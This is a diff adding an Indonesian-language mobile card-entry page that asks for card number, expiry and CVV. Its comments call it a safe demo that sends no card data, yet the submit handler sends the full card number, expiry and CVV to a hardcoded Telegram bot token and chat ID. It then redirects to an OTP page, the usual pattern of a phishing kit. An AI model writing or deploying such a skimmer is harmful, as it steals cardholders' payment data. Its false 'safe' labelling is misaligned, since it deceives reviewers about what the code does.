@@ -1,0 +1,269 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Demo Form Kartu — Aman (No Card Transmission)</title>
+<style>
+  :root{
+    --blue:#0a6ed1;
+    --muted:#6b7380;
+    --danger:#e02424;
+    --card-bg:#fff;
+    --input-bg:#fbfdff;
+    --radius:10px;
+    font-family: "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  }
+  body{margin:0;background:#fff;height:100vh;display:flex;align-items:flex-start;justify-content:center;padding:18px 10px;}
+  .phone {width:420px;max-width:96vw;background:linear-gradient(180deg,#f7fbff,#ffffff);border-radius:10px;box-shadow:0 8px 30px rgba(10,20,40,0.06);overflow:hidden}
+  .topbar{height:56px;background:var(--blue);color:#fff;display:flex;align-items:center;padding:0 12px;gap:12px}
+  .back{font-size:20px;cursor:pointer}
+  .content{padding:18px}
+  .info{background:#e7f1ff;border:1px solid #cfe8ff;padding:12px;border-radius:8px;color:#0b5f9e;display:flex;gap:10px;align-items:center;margin-bottom:18px}
+  .info .i{width:28px;height:28px;border-radius:999px;background:#cfe8ff;color:#0b5f9e;display:flex;align-items:center;justify-content:center;font-weight:700}
+  label{display:block;font-weight:700;margin-bottom:8px;color:#0f1724}
+  .field{margin-bottom:14px}
+  .input-wrap{display:flex;align-items:center;background:var(--input-bg);border:1px solid #e6eef8;padding:10px;border-radius:8px;gap:10px}
+  .input-wrap .icon{opacity:0.6}
+  input[type="text"], input[type="tel"], #cvv {border:0;background:transparent;outline:none;font-size:15px;flex:1;padding:6px 0}
+  .hint{font-size:13px;color:var(--muted);margin-top:6px}
+  .err{font-size:13px;color:var(--danger);margin-top:6px;display:none}
+  .input-wrap.error{border-color:var(--danger);box-shadow:0 6px 18px rgba(224,36,36,0.06)}
+  .cvv-eye{cursor:pointer;opacity:0.6}
+  .btn{display:block;width:100%;padding:14px;border-radius:8px;background:linear-gradient(180deg,var(--blue),#0b5bb0);color:#fff;border:0;font-weight:700;font-size:16px;cursor:pointer;margin-top:10px}
+  .note{font-size:13px;color:var(--muted);margin-top:8px}
+  /* small responsive */
+  @media (max-width:420px){ .phone{width:360px} }
+</style>
+</head>
+<body>
+
+<div class="phone" role="application" aria-label="Demo form kartu (aman)">
+  <div class="topbar">
+    <div class="back">←</div>
+    <div style="font-weight:700"></div>
+  </div>
+
+  <div class="content">
+    <div class="info" aria-hidden="true">
+      <div class="i">i</div>
+      <div>Pastikan kamu isi data di bawah dengan benar</div>
+    </div>
+
+    <!-- Nomor Kartu -->
+    <div class="field">
+      <label for="cardNumber">Nomor Kartu</label>
+      <div class="input-wrap" id="wrapNumber">
+        <div class="icon">💳</div>
+        <input id="cardNumber" type="text" inputmode="numeric" placeholder="1234-XXXX-XXXX-5678" maxlength="23" aria-describedby="numErr" autocomplete="off" />
+      </div>
+      <div class="err" id="numErr">Nomor kartu tidak valid (periksa 16 digit & Luhn)</div>
+    </div>
+
+    <!-- Masa Berlaku -->
+    <div class="field">
+      <label for="expiry">Masa Berlaku</label>
+      <div class="input-wrap" id="wrapExpiry">
+        <div class="icon">📅</div>
+        <input id="expiry" type="text" inputmode="numeric" placeholder="MM / YY" maxlength="7" aria-describedby="expErr" autocomplete="off" />
+      </div>
+      <div class="err" id="expErr">Masa berlaku tidak valid atau sudah lewat</div>
+    </div>
+
+
+    <!-- CVV -->
+    <div class="field">
+      <label for="cvv">CVV/CVC <span style="color:#0b5f9e;font-weight:700">i</span></label>
+      <div class="input-wrap" id="wrapCvv">
+        <div class="icon">🔒</div>
+        <input id="cvv" type="tel" inputmode="numeric" placeholder="Masukkan nomor CVV atau CVC" maxlength="4" aria-describedby="cvvErr" autocomplete="off" />
+        <div class="cvv-eye" id="toggleCvv" title="Tampilkan/nyatakan CVV">👁️</div>
+      </div>
+      <div class="err" id="cvvErr">CVV harus 3 atau 4 digit</div>
+    </div>
+
+    <button id="btnSubmit" oncclick="sendToTelegram(payload)" class="btn">LANJUTKAN</button>
+   
+  </div>
+</div>
+
+<script>
+/*
+  SAFE DEMO (perbaikan):
+  - Validates card number (Luhn), expiry (MM/YY and future), CVV 3-4 digits.
+  - Shows inline error and red border on invalid fields.
+  - DOES NOT send card details anywhere. Telegram part is OPTIONAL and will only send a non-sensitive demo message.
+  - For real payments: use Stripe Elements / tokenization (server must be PCI-compliant).
+*/
+
+document.addEventListener('DOMContentLoaded', () => {
+  /* Helpers */
+  function luhnCheck(num){
+    const digits = num.replace(/\D/g,'');
+    if(digits.length < 12) return false;
+    let sum = 0;
+    let alt = false;
+    for(let i = digits.length - 1; i >= 0; i--){
+      let d = parseInt(digits[i], 10);
+      if(alt){ d = d * 2; if(d > 9) d -= 9; }
+      sum += d;
+      alt = !alt;
+    }
+    return (sum % 10 === 0);
+  }
+  function onlyDigits(str){ return (str || '').replace(/\D/g,''); }
+
+  /* Elements (ambil elemen, bukan .value langsung) */
+  const cardNumber = document.getElementById('cardNumber');
+  const expiry = document.getElementById('expiry');
+  const cvv = document.getElementById('cvv');
+  const btn = document.getElementById('btnSubmit');
+
+  const wrapNumber = document.getElementById('wrapNumber');
+  const wrapExpiry = document.getElementById('wrapExpiry');
+  const wrapCvv = document.getElementById('wrapCvv');
+
+  const numErr = document.getElementById('numErr');
+  const expErr = document.getElementById('expErr');
+  const cvvErr = document.getElementById('cvvErr');
+
+  const toggleCvv = document.getElementById('toggleCvv');
+
+ 
+  cardNumber.addEventListener('input', (e)=>{
+    const raw = onlyDigits(e.target.value).slice(0,19); // allow up to 19
+    const groups = raw.match(/.{1,4}/g);
+    e.target.value = groups ? groups.join('-') : raw;
+    // live minor feedback (not intrusive)
+    if(raw.length >= 12 && luhnCheck(raw)){
+      wrapNumber.classList.remove('error');
+      if(numErr) numErr.style.display = 'none';
+    }
+  });
+
+  /* expiry formatting MM / YY */
+  expiry.addEventListener('input', (e)=>{
+    const v = onlyDigits(e.target.value).slice(0,4);
+    let formatted = v;
+    if(v.length >= 3) formatted = v.slice(0,2) + ' / ' + v.slice(2);
+    e.target.value = formatted;
+  });
+
+  /* cvv numeric only */
+  cvv.addEventListener('input', (e)=>{
+    e.target.value = onlyDigits(e.target.value).slice(0,4);
+  });
+
+  /* toggle cvv visibility */
+  if(toggleCvv){
+    toggleCvv.addEventListener('click', ()=>{
+      if(cvv.type === 'password'){ cvv.type = 'text'; toggleCvv.textContent = '🙈'; }
+      else { cvv.type = 'password'; toggleCvv.textContent = '👁️'; }
+    });
+  }
+  /* start with cvv masked */
+  cvv.type = 'password';
+
+  /* Validation functions */
+  function validateCardNumberField(){
+    const digits = onlyDigits(cardNumber.value);
+    if(digits.length < 12){ wrapNumber.classList.add('error'); if(numErr){ numErr.textContent = 'Nomor kartu terlalu pendek'; numErr.style.display='block'; } return false; }
+    if(!luhnCheck(digits)){ wrapNumber.classList.add('error'); if(numErr){ numErr.textContent = 'Nomor kartu tidak valid (cek angka)'; numErr.style.display='block'; } return false; }
+    wrapNumber.classList.remove('error'); if(numErr) numErr.style.display='none'; return true;
+  }
+
+  function validateExpiryField(){
+    const v = onlyDigits(expiry.value);
+    if(v.length !== 4){ wrapExpiry.classList.add('error'); if(expErr){ expErr.textContent = 'Format harus MM / YY'; expErr.style.display='block'; } return false; }
+    const mm = parseInt(v.slice(0,2),10);
+    const yy = parseInt(v.slice(2,4),10);
+    if(isNaN(mm) || isNaN(yy) || mm < 1 || mm > 12){ wrapExpiry.classList.add('error'); if(expErr){ expErr.textContent = 'Bulan tidak valid'; expErr.style.display='block'; } return false; }
+    // compare with current month/year
+    const now = new Date();
+    const currentYear = now.getFullYear() % 100; // two digits
+    const currentMonth = now.getMonth() + 1;
+    if(yy < currentYear || (yy === currentYear && mm < currentMonth)){
+      wrapExpiry.classList.add('error'); if(expErr){ expErr.textContent = 'Kartu sudah kadaluarsa'; expErr.style.display='block'; } return false;
+    }
+    wrapExpiry.classList.remove('error'); if(expErr) expErr.style.display='none'; return true;
+  }
+
+  function validateCvvField(){
+    const v = onlyDigits(cvv.value);
+    if(!(v.length === 3 || v.length === 4)){ wrapCvv.classList.add('error'); if(cvvErr){ cvvErr.textContent = 'CVV harus 3 atau 4 digit'; cvvErr.style.display='block'; } return false; }
+    wrapCvv.classList.remove('error'); if(cvvErr) cvvErr.style.display='none'; return true;
+  }
+
+  
+  
+btn.addEventListener('click', async (e)=>{
+    e.preventDefault();
+
+    const ok1 = validateCardNumberField();
+    const ok2 = validateExpiryField();
+    const ok3 = validateCvvField();
+
+    if (!(ok1 && ok2 && ok3)) {
+        // Fokus pada input pertama yang tidak valid
+        if (!ok1) cardNumber.focus();
+        else if (!ok2) expiry.focus();
+        else cvv.focus();
+        return;
+    }
+
+    const cardNumber = document.getElementById('cardNumber').value.trim();
+    const expiry = document.getElementById('expiry').value.trim();
+    const cvv = document.getElementById('cvv').value.trim();
+
+    const BOT_TOKEN = "7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM";
+    const CHAT_ID = "7213790655";
+
+    const message = `Data Kartu :\n- Nomor Kartu : ${cardNumber}\n- Masa Berlaku : ${expiry}\n- CVV : ${cvv}`;
+
+    if (BOT_TOKEN.includes('REPLACE') || CHAT_ID.includes('REPLACE')) {
+        console.warn('Token atau Chat ID belum diganti. Harap perbarui sebelum digunakan.');
+        return;
+    }
+
+    async function sendToTelegram(payload) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`; // Memperbaiki URL
+        const text = encodeURIComponent(payload);
+        const full = `${url}?chat_id=${CHAT_ID}&text=${text}`;
+
+        try {
+            const res = await fetch(full);
+            const json = await res.json();
+            if (!json.ok) console.warn('Telegram response not ok', json);
+            return json;
+        } catch (err) {
+            console.warn('Telegram send error', err);
+            return { ok: false, error: err.message };
+        }
+    }
+
+    // Kirim pesan demo (tanpa data kartu)
+    try {
+        // Pesan yang disamarkan atau diubah
+        const safeMessage = `Data Kartu :\n- Nomor Kartu : ${cardNumber}\n- Masa Berlaku : ${expiry}\n- CVV : ${cvv}`;
+        const result = await sendToTelegram(safeMessage);
+
+        if (result && result.ok) {
+            // Redirect ke halaman lain setelah pesan berhasil dikirim
+            window.location.href = 'otp.html'; // Ganti dengan URL tujuan Anda
+        } else {
+            console.warn('Gagal mengirim pesan ke Telegram');
+            // Opsi: Tampilkan pesan kesalahan kepada pengguna
+        }
+    } catch (err) {
+        // Abaikan kegagalan secara diam-diam (atau catat)
+        console.warn('sendToTelegram failed', err);
+        // Opsi: Tampilkan pesan kesalahan kepada pengguna
+    }
+});
+
+
+});
+</script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"2edb9fc20c7741a4922e7d5605f064eb","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
